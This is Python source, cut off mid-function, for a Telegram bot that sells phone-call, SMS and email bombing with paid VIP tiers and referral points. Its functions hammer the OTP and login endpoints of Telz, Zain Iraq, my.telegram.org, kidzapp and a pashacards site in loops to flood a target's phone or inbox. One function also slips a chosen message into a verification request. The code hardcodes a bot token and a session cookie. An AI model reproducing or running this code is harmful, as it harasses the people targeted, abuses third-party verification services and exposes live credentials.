import os
import sys
import time
import uuid
import random
import sqlite3
import json
import base64
import hashlib
import logging
import threading
import asyncio
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

import requests
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = "8844906485:AAHxU1GSFLasIkieaJAr8xXsG72am0vZBWI"
PAYMENT_USERNAME = "vsf911"
OWNER_IDS = [8426582765]
MAX_WORKERS = 500

BUTTONS_STATUS = {
    "call": True,
    "spam_asia": True,
    "spam_ether": True,
    "spam_telegram": True,
    "spam_email": True,
    "referral": True
}

DEFAULT_LIMITS = {
    "call": 5,
    "spam_asia": 10,
    "spam_ether": 10,
    "spam_telegram": 5,
    "spam_email": 10
}

GREEN = "🟢"
RED = "🔴"

flask_app = Flask(__name__)
bot_app = None

db_lock = threading.RLock()
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

sent_calls = {}
call_lock = threading.Lock()

def init_db():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        conn.execute("PRAGMA cache_size=10000")
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            is_vip INTEGER DEFAULT 0,
            vip_expiry TEXT,
            join_date TEXT,
            is_admin INTEGER DEFAULT 0,
            extra_tokens INTEGER DEFAULT 0,
            extra_tokens_expiry TEXT,
            points INTEGER DEFAULT 0,
            referrer_id INTEGER DEFAULT NULL,
            referral_count INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS referral_links (
            user_id INTEGER PRIMARY KEY,
            link_code TEXT UNIQUE,
            total_clicks INTEGER DEFAULT 0,
            total_registered INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS user_daily_limits (
            user_id INTEGER,
            service TEXT,
            used_today INTEGER DEFAULT 0,
            last_reset TEXT,
            PRIMARY KEY (user_id, service)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS calls_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            call_time TEXT,
            status TEXT,
            response TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS spam_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            service TEXT,
            count INTEGER,
            success_count INTEGER,
            fail_count INTEGER,
            spam_time TEXT,
            status TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS daily_stats (
            date TEXT PRIMARY KEY,
            total_calls INTEGER DEFAULT 0,
            total_spam INTEGER DEFAULT 0,
            unique_users INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS force_channels (
            channel_id TEXT PRIMARY KEY,
            channel_username TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        
        for service, limit in DEFAULT_LIMITS.items():
            c.execute(f"INSERT OR IGNORE INTO settings (key, value) VALUES ('limit_{service}', '{limit}')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('call_wait', '30')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('referral_points', '1')")
        
        conn.commit()
        conn.close()
        logger.info("✅ Ma'lumotlar bazasi tayyor")

def migrate_db():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        try:
            c.execute('ALTER TABLE referral_links ADD COLUMN total_clicks INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE referral_links ADD COLUMN total_registered INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN extra_tokens INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN extra_tokens_expiry TEXT')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN points INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN referrer_id INTEGER DEFAULT NULL')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN referral_count INTEGER DEFAULT 0')
        except:
            pass
        conn.commit()
        conn.close()
        logger.info("✅ Ma'lumotlar bazasi yangilandi")

init_db()
migrate_db()

def generate_referral_code(user_id):
    code = hashlib.md5(f"{user_id}{uuid.uuid4()}{time.time()}".encode()).hexdigest()[:10]
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO referral_links (user_id, link_code) VALUES (?, ?)', (user_id, code))
        conn.commit()
        conn.close()
    return code

def get_referral_code(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT link_code FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r:
        return r[0]
    return generate_referral_code(user_id)

def get_user_points(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT points FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r and r[0] is not None else 0

def get_referral_count(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT referral_count FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r and r[0] is not None else 0

def get_referral_stats(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT total_clicks, total_registered FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r:
        return r[0] or 0, r[1] or 0
    return 0, 0

def update_referral_click(link_code):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE referral_links SET total_clicks = total_clicks + 1 WHERE link_code = ?', (link_code,))
        conn.commit()
        conn.close()

def update_user_points(user_id, points):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE users SET points = points + ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()

def is_owner(user_id): 
    return user_id in OWNER_IDS

def is_admin(user_id):
    if user_id in OWNER_IDS: 
        return True
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT is_admin FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r and r[0] == 1

def is_vip(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT is_vip, vip_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] == 1:
        if r[1]:
            try:
                expiry = datetime.strptime(r[1], '%Y-%m-%d')
                if expiry >= datetime.now(): 
                    return True
            except: 
                return True
        return True
    return False

def get_extra_tokens(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT extra_tokens, extra_tokens_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] and r[1]:
        try:
            expiry = datetime.strptime(r[1], '%Y-%m-%d %H:%M:%S')
            if expiry >= datetime.now(): 
                return r[0]
        except: 
            pass
    return 0

def get_service_limit(user_id, service):
    if is_vip(user_id): 
        return 999999
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute(f'SELECT value FROM settings WHERE key = "limit_{service}"')
        r = c.fetchone()
        conn.close()
    free_limit = int(r[0]) if r else DEFAULT_LIMITS.get(service, 5)
    extra = get_extra_tokens(user_id)
    return free_limit + extra

def get_used_today(user_id, service):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT used_today, last_reset FROM user_daily_limits WHERE user_id = ? AND service = ?', (user_id, service))
        r = c.fetchone()
        conn.close()
    today = datetime.now().strftime('%Y-%m-%d')
    if r and r[1] == today: 
        return r[0]
    return 0

def increment_used(user_id, service, count=1):
    today = datetime.now().strftime('%Y-%m-%d')
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('''INSERT INTO user_daily_limits (user_id, service, used_today, last_reset) 
                     VALUES (?, ?, ?, ?) ON CONFLICT(user_id, service) DO UPDATE SET 
                     used_today = used_today + ?, last_reset = ?''',
                  (user_id, service, count, today, count, today))
        conn.commit()
        conn.close()

def can_use_service(user_id, service):
    used = get_used_today(user_id, service)
    limit = get_service_limit(user_id, service)
    return used < limit, limit - used

def add_call_log(user_id, phone, status, response=""):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT INTO calls_log (user_id, phone, call_time, status, response) VALUES (?, ?, ?, ?, ?)',
                 (user_id, phone, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status, str(response)[:500]))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_calls = total_calls + 1 WHERE date = ?', (today,))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 1, 0, 0)', (today,))
        conn.commit()
        conn.close()

def add_spam_log(user_id, phone, service, count, success_count, fail_count, status):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT INTO spam_log (user_id, phone, service, count, success_count, fail_count, spam_time, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                 (user_id, phone, service, count, success_count, fail_count, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_spam = total_spam + ? WHERE date = ?', (count, today))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 0, ?, 0)', (today, count))
        conn.commit()
        conn.close()

def reset_daily_limits():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE user_daily_limits SET used_today = 0, last_reset = ? WHERE last_reset != ?', (today, today))
        conn.commit()
        conn.close()

async def check_channel(user_id, context):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT channel_username FROM force_channels')
        channels = c.fetchall()
        conn.close()
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=f"@{ch[0]}", user_id=user_id)
            if member.status in ['left', 'kicked']: 
                return False, ch[0]
        except: 
            continue
    return True, None

def telz_call_real(phone):
    android_id = uuid.uuid4().hex[:16]
    uid = str(uuid.uuid4())
    
    headers = {
        "User-Agent": "Telz-Android/17.5.48",
        "Content-Type": "application/json; charset=UTF-8"
    }
    
    try:
        requests.post("https://api.telz.com/app/auth_list", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "auth_list",
            "os": "android", "os_version": "15", "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        requests.post("https://api.telz.com/app/run", json={
            "android_id": android_id, "app_version": "17.5.48", "device_name": "",
            "event": "run", "ipv4_address": "", "lang": "ar",
            "network_country": "iq", "network_type": "WIFI", "os": "android",
            "os_version": "15", "push_token": "", "roaming": "no", "root": "no",
            "run_id": str(int(time.time())), "sim_country": "iq",
            "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        requests.post("https://api.telz.com/app/validate_phonenumber", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "validate_phonenumber",
            "os": "android", "os_version": "15", "phone": phone, "region": "IQ",
            "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        time.sleep(0.5)
        
        r4 = requests.post("https://api.telz.com/app/auth_call", json={
            "android_id": android_id, "app_version": "17.5.48", "attempt": "0",
            "event": "auth_call", "lang": "ar", "os": "android", "os_version": "15",
            "phone": phone, "ts": int(time.time() * 1000), "uuid": uid,
            "run_id": str(int(time.time() * 1000))
        }, headers=headers, timeout=5)
        
        result = r4.json()
        
        if result.get('status') == 'ok':
            return True, "✅ Qo'ng'iroq muvaffaqiyatli yuborildi"
        elif result.get('reason') == '3.1':
            return False, "⚠️ Bu raqam allaqachon ro'yxatdan o'tgan"
        else:
            return False, "❌ Qo'ng'iroq yuborilmadi"
            
    except Exception as e:
        return False, f"❌ Xatolik: {str(e)[:30]}"

def send_ether_spam_real(phone, count):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        try:
            url = "https://mw-mobileapp.iq.zain.com/api/otp/request"
            payload = {"msisdn": phone}
            headers = {'User-Agent': "okhttp/4.11.0", 'Content-Type': "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=5)
            if r.status_code in [200, 201, 202]:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

def send_telegram_spam_real(phone, count):
    success, failed = 0, 0
    for i in range(min(count, 30)):
        try:
            cookies = {'stel_ln': 'ar', 'stel_acid': 'FrtmvJBwZdq7sey4JzSCm0bwhg97BgwnV5sFftSz09zwfRILdgH_sEVFAIp0KIpM'}
            data = {'phone': phone}
            r = requests.post('https://my.telegram.org/auth/send_password', cookies=cookies, data=data, timeout=5)
            if '"random_hash"' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.15)
    return success, failed

def send_gmail_spam_real(email, count):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        try:
            json_data = {'email': email, 'sdk': 'web', 'platform': 'desktop'}
            r = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', json=json_data, timeout=5)
            if '"EMAIL SENT"' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

def send_asia_spam_real(phone, count, message):
    success, failed = 0, 0
    name = base64.b64decode('2ZjZrNmA').decode()
    for i in range(min(count, 100)):
        try:
            data = {
                'action': 'send_pin_code', 'msisdn': phone, 'appId': '3',
                'packageName': name + message, 'paymentMethodId': '3'
            }
            r = requests.post('https://pashacards.net/wp-admin/admin-ajax.php', data=data, timeout=5)
            if '"success":true' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

async def make_call(phone, user_id):
    loop = asyncio.get_event_loop()
    success, message = await loop.run_in_executor(executor, telz_call_real, phone)
    add_call_log(user_id, phone, 'muvaffaqiyatli' if success else 'muvaffaqiyatsiz', message)
    return success, message

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        args = context.args
        referrer_id = None
        if args and args[0].startswith('ref_'):
            code = args[0].replace('ref_', '')
            update_referral_click(code)
            with db_lock:
                conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT user_id FROM referral_links WHERE link_code = ?', (code,))
                r = c.fetchone()
                if r:
                    referrer_id = r[0]
                conn.close()
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT * FROM users WHERE user_id = ?', (user.id,))
            existing = c.fetchone()
            if not existing:
                today = datetime.now().strftime('%Y-%m-%d')
                points_to_add = 1
                if referrer_id and referrer_id != user.id:
                    c.execute("INSERT INTO users (user_id, username, first_name, join_date, points, referrer_id, referral_count) VALUES (?, ?, ?, ?, ?, ?, 0)",
                             (user.id, user.username or "None", user.first_name, today, points_to_add, referrer_id))
                   